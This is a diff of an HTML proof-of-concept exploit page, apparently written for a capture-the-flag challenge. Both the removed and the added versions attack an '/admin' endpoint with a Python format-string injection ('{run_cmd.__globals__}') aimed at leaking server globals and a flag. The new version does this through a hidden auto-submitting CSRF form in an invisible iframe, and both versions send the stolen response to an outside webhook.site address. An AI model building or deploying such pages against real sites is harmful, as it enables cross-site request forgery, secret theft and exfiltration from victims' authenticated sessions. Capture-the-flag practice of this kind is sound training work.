@@ -1,18 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Exploitation</title>
-</head>
+<head><title>XSS POC</title></head>
 <body>
-  <script>
-    // Faire la requête à /admin avec l'injection
-    fetch('/admin?prompt={run_cmd.__globals__["FLAG"]}')
-      .then(response => response.text())
-      .then(data => {
-        // Envoyer le résultat à votre webhook
-        fetch('https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?result=' + encodeURIComponent(data));
-      });
-  </script>
-  <p>Chargement...</p>
+<h1>Loading...</h1>
+
+<!-- Auto-submit form targeting the admin endpoint -->
+<iframe style="width:0;height:0;border:0;border:none;" name="csrf-frame"></iframe>
+<form id="csrf-form" action="https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/admin" method="GET" target="csrf-frame">
+  <input type="hidden" name="prompt" value="{run_cmd.__globals__}">
+</form>
+
+<script>
+// Auto-submit the form
+window.onload = function() {
+  document.getElementById("csrf-form").submit();
+  // Wait a bit then check the result from iframe
+  setTimeout(function() {
+    // Try to fetch the content of the iframe
+    try {
+      var frameContent = document.getElementsByName('csrf-frame')[0].contentDocument.body.innerHTML;
+      fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?result=" + encodeURIComponent(frameContent));
+    } catch(e) {
+      fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?error=" + encodeURIComponent(e.toString()));
+    }
+  }, 2000);
+}
+</script>
 </body>
 </html>
